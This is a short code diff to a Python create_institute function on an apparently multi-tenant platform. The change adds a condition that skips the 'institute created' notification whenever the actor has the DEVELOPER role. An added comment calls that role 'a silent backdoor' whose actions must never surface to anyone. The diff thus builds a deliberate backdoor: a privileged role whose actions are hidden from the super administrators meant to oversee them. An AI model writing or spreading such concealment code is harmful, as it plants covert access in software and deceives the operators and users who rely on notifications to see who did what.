@@ -266,14 +266,17 @@ def create_institute(
     result["admin_email"] = admin_email
     if commit:
         account_service.send_account_credentials_email(db, admin, temp_password, role_label="Institute Admin")
-        notification_service.notify_roles(
-            db,
-            {SUPER_ADMIN, DEVELOPER},
-            kind="institute_created",
-            title="Institute created",
-            message=f"{actor.email} created institute {institute.name}.",
-            link_url=f"/super-admin/institutes/{institute.id}",
-        )
+        # The developer layer is a silent backdoor: its actions must never
+        # surface to anyone else, including via a platform notification.
+        if actor.role.name != DEVELOPER:
+            notification_service.notify_roles(
+                db,
+                {SUPER_ADMIN, DEVELOPER},
+                kind="institute_created",
+                title="Institute created",
+                message=f"{actor.email} created institute {institute.name}.",
+                link_url=f"/super-admin/institutes/{institute.id}",
+            )
     return result
 
 
